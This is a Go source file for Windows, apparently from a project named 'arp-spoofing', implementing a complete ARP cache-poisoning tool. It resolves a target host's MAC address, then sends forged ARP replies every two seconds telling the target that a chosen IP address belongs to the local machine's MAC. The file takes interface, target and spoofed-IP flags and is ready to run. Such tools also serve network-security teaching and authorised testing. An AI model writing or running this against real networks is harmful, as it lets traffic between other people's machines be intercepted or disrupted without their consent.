//go:build windows

package main

import (
	"bytes"
	"context"
	"flag"
	"fmt"
	"net"
	"net/netip"
	"os"
	"os/signal"
	"time"

	"arp-spoofing/internal/app"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func resolveMAC(handle *pcap.Handle, iface *net.Interface, localIP, targetIP netip.Addr) (net.HardwareAddr, error) {
	broadcast := net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
	zeroMAC := net.HardwareAddr{0, 0, 0, 0, 0, 0}

	req := app.BuildARPFrame(iface.HardwareAddr, localIP, broadcast, targetIP, layers.ARPRequest)
	if err := handle.WritePacketData(req); err != nil {
		return nil, fmt.Errorf("send ARP request: %w", err)
	}

	ps := gopacket.NewPacketSource(handle, handle.LinkType())
	packetChan := ps.Packets()

	timeout := time.After(3 * time.Second)
	for {
		select {
		case <-timeout:
			return nil, fmt.Errorf("ARP resolution timeout for %s", targetIP)
		case packet, ok := <-packetChan:
			if !ok {
				return nil, fmt.Errorf("packet capture closed during ARP resolution")
			}
			arpLayer := packet.Layer(layers.LayerTypeARP)
			if arpLayer == nil {
				continue
			}
			arp := arpLayer.(*layers.ARP)
			if arp.Operation != layers.ARPReply {
				continue
			}
			senderIP, ok := netip.AddrFromSlice(arp.SourceProtAddress)
			if !ok {
				continue
			}
			if senderIP == targetIP && !bytes.Equal(arp.SourceHwAddress, zeroMAC) {
				return net.HardwareAddr(arp.SourceHwAddress), nil
			}
		}
	}
}

func run(ifname, targetIPStr, spoofedIPStr string) error {
	iface, myIP, err := app.GetInterface(ifname)
	if err != nil {
		return fmt.Errorf("failed to get local MAC/IP for %s: %w", ifname, err)
	}

	targetIP, err := app.ParseIPv4(targetIPStr)
	if err != nil {
		return err
	}

	spoofedIP, err := app.ParseIPv4(spoofedIPStr)
	if err != nil {
		return err
	}

	handle, err := app.OpenPcap(ifname, myIP)
	if err != nil {
		return fmt.Errorf("pcap open: %w\nHint: install Npcap from https://npcap.com", err)
	}
	defer handle.Close()

	targetMAC, err := resolveMAC(handle, iface, myIP, targetIP)
	if err != nil {
		return fmt.Errorf("resolve MAC for %s: %w", targetIP, err)
	}

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt)
	defer stop()

	fmt.Printf("[*] Local MAC : %s\n", iface.HardwareAddr)
	fmt.Printf("[*] Local IP  : %s\n", myIP)
	fmt.Printf("[*] Spoofing  : %s is at %s\n", spoofedIP, iface.HardwareAddr)
	fmt.Printf("[*] Target    : %s is at %s\n", targetIP, targetMAC)
	fmt.Println("[*] Sending gratuitous ARP every 2 seconds")
	fmt.Println("[*] Press Ctrl+C to exit")

	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	for {
		pkt := app.BuildARPFrame(iface.HardwareAddr, spoofedIP, targetMAC, targetIP, layers.ARPReply)
		if err := handle.WritePacketData(pkt); err != nil {
			fmt.Fprintf(os.Stderr, "send gratuitous ARP: %v\n", err)
		} else {
			fmt.Printf("[+] Sent gratuitous ARP: %s is at %s\n", spoofedIP, iface.HardwareAddr)
		}

		select {
		case <-ctx.Done():
			fmt.Println("\n[*] Exiting (no restore capability without target IP)")
			return nil
		case <-ticker.C:
		}
	}
}

func main() {
	var ifname, targetIP, spoofedIP string
	flag.StringVar(&ifname, "i", "", "network interface")
	flag.StringVar(&targetIP, "t", "", "target IPv4 address")
	flag.StringVar(&spoofedIP, "s", "", "spoofed IPv4 address")
	flag.Parse()

	if ifname == "" || targetIP == "" || spoofedIP == "" {
		flag.Usage()
		os.Exit(1)
	}

	if err := run(ifname, targetIP, spoofedIP); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}
